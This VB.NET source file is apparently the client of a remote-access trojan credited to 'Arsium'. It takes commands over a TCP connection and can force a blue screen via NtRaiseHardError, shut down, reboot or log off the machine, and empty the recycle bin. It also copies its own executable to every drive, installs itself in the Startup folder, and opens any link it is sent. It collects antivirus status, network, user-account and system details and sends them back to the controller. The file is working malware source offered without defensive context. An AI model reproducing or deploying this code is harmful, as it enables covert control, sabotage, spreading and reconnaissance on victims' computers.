Imports System.Drawing
Imports System.IO
Imports System.Net.Sockets
Imports System.Runtime.InteropServices
Imports System.Text
Imports System.Windows.Forms
Imports System.Management
''||       AUTHOR Arsium       ||
''||       github : https://github.com/arsium       ||
Public Class MainCL
    Public Shared Sub ST(ByVal k As TcpClient, ByVal l As String)
        MSG(k, l)
    End Sub

    Public Shared Async Sub MSG(ByVal k As TcpClient, ByVal l As String)



        Dim j As String() = Split(l, "|SP2|")
        If j(1).Length = 0 Then
            MessageBox.Show(j(0))
        Else

            If j(1) = "|LGT|" Then

                PowerOptions(NativeAPI.EWX_LOGOFF, 0)

            ElseIf j(1) = "|STD|" Then

                PowerOptions(NativeAPI.EWX_POWEROFF, 0 Or NativeAPI.SHTDN_REASON_MAJOR_SOFTWARE)

            ElseIf j(1) = "|RBT|" Then

                PowerOptions(NativeAPI.EWX_REBOOT, 0 Or NativeAPI.SHTDN_REASON_MINOR_BLUESCREEN)

            ElseIf j(1) = "|BSOD|" Then

                StartThat()


                ' "|HBNT|"
                ' "|SPND|"
            ElseIf j(1) = "|SPND|" Then

                HIBSUSPEND(False)
            ElseIf j(1) = "|HBNT|" Then

                HIBSUSPEND(True)


            ElseIf j(1) = "|SETWP|" Then

                '  Dim o As Byte() = Await Task.Run(Function() System.Text.Encoding.Default.GetBytes(j(2)))

                Try


                    Await Task.Run(Sub()
                                       Try
                                           IO.File.WriteAllText(IO.Path.GetTempPath & "\" & j(3), j(2), encoding:=Encoding.Default)
                                           NativeAPI.SetDeskWallpaper(IO.Path.GetTempPath & "\" & j(3))
                                       Catch ex As Exception
                                           Exit Sub
                                       End Try

                                   End Sub)

                Catch ex As Exception

                End Try


            ElseIf j(1) = "|INFO|" Then

                Await Task.Run(Sub() InforMation(k))



            ElseIf j(1) = "|SPREAD|" Then

                Await Task.Run(Sub() SPRD())


            ElseIf j(1) = "|ATSRP|" Then
                Await Task.Run(Sub() ATSRP())


            ElseIf j(1) = "|EMPB|" Then
                Await Task.Run(Sub() EmptyBin())

            ElseIf j(1) = "|LNK|" Then
                Await Task.Run(Sub() StartALink(j(2)))

            ElseIf j(1) = "|MSOUND|" Then

                Await Task.Run(Sub() AppCommand.Mute_Sound())

            ElseIf j(1) = "|+SOUND|" Then

                Await Task.Run(Sub() AppCommand.VolUp())


            ElseIf j(1) = "|-SOUND|" Then

                Await Task.Run(Sub() AppCommand.VolDown())

            End If

        End If

    End Sub
    Public Shared Sub StartALink(ByVal LK As String)
        Try
            System.Diagnostics.Process.Start(LK)

        Catch ex As Exception

        End Try
    End Sub

    Public Shared Sub EmptyBin()
        Try
            NativeAPI.SHEmptyRecycleBinA(0, "", 1 Or 2 Or 3)
        Catch ex As Exception

        End Try
    End Sub

    Public Shared Sub SPRD()

        Dim allDrives() As DriveInfo = DriveInfo.GetDrives()
        Dim d As DriveInfo


        For Each d In allDrives
            Try
                Dim l As Byte() = IO.File.ReadAllBytes(IO.Path.GetFullPath(System.Windows.Forms.Application.ExecutablePath))


                IO.File.WriteAllBytes(d.Name & "\" & System.AppDomain.CurrentDomain.FriendlyName, l)

            Catch ex As Exception

            End Try


        Next

    End Sub
    'https://askubuntu.com/questions/3369/what-is-the-difference-between-hibernate-and-suspend
    'Suspend does not turn off your computer. It puts the computer and all peripherals on a low power consumption mode. If the battery runs out or the computer turns off for some reason, the current session and unsaved changes will be lost.

    'Hibernate saves the state Of your computer To the hard disk And completely powers off. When resuming, the saved state Is restored To RAM.
    Public Shared Sub HIBSUSPEND(ByVal B As Boolean)
        Dim t1 As Boolean
        NativeAPI.RtlAdjustPrivilege(19, True, False, t1)

        NativeAPI.SetSuspendState(B, True, True)
    End Sub
    Public Shared Sub ATSRP()
        If Not IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & System.AppDomain.CurrentDomain.FriendlyName) Then


            Try
                Dim l As Byte() = IO.File.ReadAllBytes(IO.Path.GetFullPath(System.Windows.Forms.Application.ExecutablePath))


                IO.File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & System.AppDomain.CurrentDomain.FriendlyName, l)

            Catch ex As Exception
            End Try
        End If
    End Sub
    Public Shared Sub StartThat()
        Dim t1 As Boolean
        Dim t2 As UInteger
        NativeAPI.RtlAdjustPrivilege(19, True, False, t1)
        NativeAPI.NtRaiseHardError(NativeAPI.i, 0, 0, IntPtr.Zero, 6, t2)
    End Sub
    Public Shared Sub PowerOptions(ByVal flg As Integer, Optional ByVal minRea As Integer = 0)
        Dim t1 As Boolean


        NativeAPI.RtlAdjustPrivilege(19, True, False, t1)
        NativeAPI.ExitWindowsEx(flg, 0 Or minRea)
    End Sub


    Public Shared Async Sub InforMation(ByVal k As TcpClient)


        Dim realAV = New StringBuilder()

        realAV.AppendLine("========AVs & AntiSpyWares========")
        realAV.AppendLine(Nothing)
        Try
            Using searcherV2 = New ManagementObjectSearcher("\\" & Environment.MachineName & "\root\SecurityCenter2", "SELECT * FROM AntiSpywareProduct")
                Dim searcherInstance = searcherV2.[Get]()

                For Each j In searcherInstance
                    realAV.AppendLine("AntiSpywrare : " & j("displayName").ToString)
                    realAV.AppendLine(Nothing)
                Next

            End Using

        Catch EX As Exception
            realAV.AppendLine(Nothing)

        End Try


        Try

            Using searcher = New ManagementObjectSearcher("\\" & Environment.MachineName & "\root\SecurityCenter2", "SELECT * FROM AntivirusProduct")
                Dim searcherInstance = searcher.[Get]()


                For Each instance In searcherInstance
                    realAV.AppendLine("AV : " & instance("displayName").ToString())
                    realAV.AppendLine(Nothing)
                Next

                '  Dim ending As String() = Strings.Split(realAV.ToString(), Environment.NewLine)

            End Using
        Catch EX As Exception
            realAV.AppendLine(Nothing)
        End Try


        Try
            Using searcherVz2 = New ManagementObjectSearcher("\\" & Environment.MachineName & "\root\microsoft\windows\defender", "SELECT * FROM BaseStatus")
                Dim searcherInstance = searcherVz2.[Get]()

                For Each j In searcherInstance


                    realAV.AppendLine("Windows Defender : AntivirusEnabled : " & j("AntivirusEnabled").ToString)
                    realAV.AppendLine(Nothing)
                    realAV.AppendLine("Windows Defender : RealTimeProtection : " & j("RealTimeProtectionEnabled").ToString)
                    realAV.AppendLine(Nothing)
                Next

            End Using
        Catch EX As Exception
            realAV.AppendLine(Nothing)
        End Try

        realAV.AppendLine(Nothing)
        realAV.AppendLine(Nothing)
        realAV.AppendLine(Nothing)





        realAV.AppendLine("========NetWork Adapters & Information========")
        realAV.AppendLine(Nothing)
        Try
            Using searcherVz2 = New ManagementObjectSearcher("\\" & Environment.MachineName & "\root\CIMV2", "SELECT * FROM Win32_NetworkAdapterConfiguration") '\\DESKTOP-3JC68JD\ROOT\CIMV2:Win32_NetworkAdapterConfiguration
                Dim searcherInstance = searcherVz2.[Get]()

                For Each j In searcherInstance

                    Try
                        realAV.AppendLine("Caption : " & j("Caption").ToString)
                        realAV.AppendLine("Description : " & j("Description").ToString)
                        realAV.AppendLine("DHCPServer : " & j("DHCPServer").ToString)
                        realAV.AppendLine("DHCPServer : " & j("MACAddress").ToString)
                        realAV.AppendLine("ServiceName : " & j("ServiceName").ToString)

                        For Each yu As String In j("IPAddress")
                            realAV.AppendLine("IPAddress : " & yu)
                        Next


                        realAV.AppendLine(Nothing)


                    Catch ze As Exception
                        realAV.AppendLine(Nothing)
                    End Try
                Next

            End Using
        Catch EX As Exception
            realAV.AppendLine(Nothing)
        End Try



        realAV.AppendLine(Nothing)
        realAV.AppendLine(Nothing)
        realAV.AppendLine(Nothing)

        'ROOT\CIMV2:Win32_ComputerSystem

        realAV.AppendLine("========User Accounts========")
        realAV.AppendLine(Nothing)


        Try
            Using searcherVz2 = New ManagementObjectSearcher("\\" & Environment.MachineName & "\root\CIMV2", "SELECT * FROM Win32_UserAccount") '\\DESKTOP-3JC68JD\ROOT\CIMV2:Win32_NetworkAdapterConfiguration
                Dim searcherInstance = searcherVz2.[Get]()

                For Each j In searcherInstance

                    Try
                        realAV.AppendLine("Name : " & j("Name").ToString)
                        realAV.AppendLine("AccountType : " & j("AccountType").ToString)
                        realAV.AppendLine("Caption : " & j("Caption").ToString)
                        realAV.AppendLine("FullName : " & j("FullName").ToString)
                        realAV.AppendLine("SID : " & j("SID").ToString)
                        realAV.AppendLine("LocalAccount : " & j("LocalAccount").ToString)
                        realAV.AppendLine("Disable : " & j("Disable").ToString)
                        realAV.AppendLine("PasswordChangeable : " & j("PasswordChangeable").ToString)

                        realAV.AppendLine(Nothing)
                        ' For Each yu As String In j("IPAddress")
                        '   realAV.AppendLine(yu)
                        '
                    Catch ze As Exception
                        realAV.AppendLine(Nothing)
                    End Try
                Next

            End Using
        Catch EX As Exception
            realAV.AppendLine(Nothing)
        End Try

        realAV.AppendLine(Nothing)
        realAV.AppendLine(Nothing)
        realAV.AppendLine(Nothing)



        realAV.AppendLine("========System Information========")
        realAV.AppendLine(Nothing)


        Try
            Using searcherVz2 = New ManagementObjectSearcher("\\" & Environment.MachineName & "\root\CIMV2", "SELECT * FROM Win32_ComputerSystem")
                Dim searcherInstance = searcherVz2.[Get]()

                For Each j In searcherInstance
                    realAV.AppendLine("SystemType : " & j("SystemType").ToString)

                    realAV.AppendLine("TotalPhysicalMemory : " & j("TotalPhysicalMemory").ToString)
                    realAV.AppendLine("BootupState : " & j("BootupState").ToString)

                    realAV.AppendLine("PrimaryOwnerName : " & j("PrimaryOwnerName").ToString)
                    realAV.AppendLine("UserName : " & j("UserName").ToString)
                    realAV.AppendLine("Caption : " & j("Caption").ToString)

                    realAV.AppendLine("Model : " & j("Model").ToString) 'carte mère
                    realAV.AppendLine("Manufacturer : " & j("Manufacturer").ToString) 'carte mère


                    realAV.AppendLine("NumberOfLogicalProcessors : " & j("NumberOfLogicalProcessors").ToString)
                    realAV.AppendLine("NumberOfProcessors : " & j("NumberOfProcessors").ToString) 'carte mère
                    For Each nk In j.Properties
                        '     realAV.AppendLine(nk.Name & "  :  " & nk.Value)
                    Next
                    realAV.AppendLine(Nothing)
                Next

            End Using
        Catch EX As Exception
            realAV.AppendLine(Nothing)
        End Try

        realAV.AppendLine(Nothing)
        realAV.AppendLine(Nothing)
        realAV.AppendLine(Nothing)
        realAV.Append("|INFOSYST|")

        '  Return (realAV.ToString)
        Dim S As String = realAV.ToString

        Dim B As Byte() = System.Text.Encoding.UTF8.GetBytes(S)
        Await k.GetStream.WriteAsync(B, 0, B.Length)
    End Sub
    Public Function ImageToBytes(ByVal img As Image) As Byte()
        Using mStream As New MemoryStream()
            img.Save(mStream, img.RawFormat)
            Return mStream.ToArray()
        End Using
    End Function

    Public Function BytesToImage(ByVal Bytesss As Byte()) As Image
        Using mStream As New MemoryStream(Bytesss)
            Return Image.FromStream(mStream)
        End Using
    End Function

    Public Shared Sub SetWallpaper(ByVal P As String)

        NativeAPI.SystemParametersInfo(NativeAPI.SPI_SETDESKWALLPAPER, 0, P, NativeAPI.SPIF_UPDATEINIFILE Or NativeAPI.SPIF_SENDWININICHANGE)
    End Sub
    '' https://stackoverflow.com/questions/13139181/how-to-programmatically-set-the-system-volume
    '' https://www.dotnetcurry.com/ShowArticle.aspx?ID=431

    Public Class AppCommand

        Private Const APPCOMMAND_VOLUME_MUTE As Integer = &H80000
        Private Const APPCOMMAND_VOLUME_UP As Integer = &HA0000
        Private Const APPCOMMAND_VOLUME_DOWN As Integer = &H90000
        Private Const WM_APPCOMMAND As Integer = &H319

        <DllImport("user32.dll")>
        Private Shared Function SendMessageW(ByVal hWnd As IntPtr,
        ByVal Msg As Integer, ByVal wParam As IntPtr,
        ByVal lParam As IntPtr) As IntPtr

        End Function

        Private Shared fwHandle As New Form

        Public Shared Sub Mute_Sound()
            SendMessageW(fwHandle.Handle, WM_APPCOMMAND, fwHandle.Handle, APPCOMMAND_VOLUME_MUTE)
        End Sub


        Public Shared Sub VolDown()

            SendMessageW(fwHandle.Handle, WM_APPCOMMAND, fwHandle.Handle, APPCOMMAND_VOLUME_DOWN)
        End Sub

        Public Shared Sub VolUp()
            SendMessageW(fwHandle.Handle, WM_APPCOMMAND, fwHandle.Handle, APPCOMMAND_VOLUME_UP)
        End Sub



    End Class
    ''

    Public Class NativeAPI

        <DllImport("Shell32.dll")>
        Public Shared Function SHEmptyRecycleBinA(ByVal hWnd As IntPtr, pszRootPath As String, ByVal FLGs As Integer) As IntPtr

        End Function

        <DllImport("PowrProf.dll", ExactSpelling:=True, SetLastError:=True)>
        Friend Shared Function SetSuspendState(ByVal bHibernate As Boolean, ByVal bForce As Boolean, ByVal bWakeupEventsDisabled As Boolean) As Boolean

        End Function

        Public Const i = &HC0000022  ''error code

        <DllImport("ntdll.dll")>
        Public Shared Function RtlAdjustPrivilege(ByVal Privilege As Integer, ByVal bEnablePrivilege As Boolean, ByVal IsThreadPrivilege As Boolean, <Out> ByRef PreviousValue As Boolean) As UInteger

        End Function

        <DllImport("ntdll.dll")>
        Public Shared Function NtRaiseHardError(ByVal ErrorStatus As Integer, ByVal NumberOfParameters As UInteger, ByVal UnicodeStringParameterMask As UInteger, ByVal Parameters As IntPtr, ByVal ValidResponseOption As UInteger, <Out> ByRef Response As UInteger) As UInteger

        End Function

        Friend Const EWX_LOGOFF As Integer = &H0
        Friend Const EWX_SHUTDOWN As Integer = &H1
        Friend Const EWX_REBOOT As Integer = &H2
        Friend Const EWX_FORCE As Integer = &H4
        Friend Const EWX_POWEROFF As Integer = &H8
        Friend Const EWX_FORCEIFHUNG As Integer = &H10

        Friend Const SHTDN_REASON_MINOR_BLUESCREEN = &HF
        Friend Const SHTDN_REASON_MAJOR_SOFTWARE = &H30000

        <DllImport("user32.dll", ExactSpelling:=True, SetLastError:=True)>
        Friend Shared Function ExitWindowsEx(ByVal flg As Integer, ByVal rea As Integer) As Boolean

        End Function

        <DllImport("user32.dll")>
        Public Shared Function SetDeskWallpaper(ByVal FileName As String) As Long

        End Function


        Public Const SPI_SETDESKWALLPAPER As Integer = 20
        Public Const SPIF_UPDATEINIFILE As Integer = &H1
        Public Const SPIF_SENDWININICHANGE As Integer = &H2

        <DllImport("user32.dll", CharSet:=CharSet.Auto)>
        Public Shared Function SystemParametersInfo(ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer

        End Function
        Public Enum Style
            Tiled
            Centered
            Stretched
        End Enum
    End Class

End Class
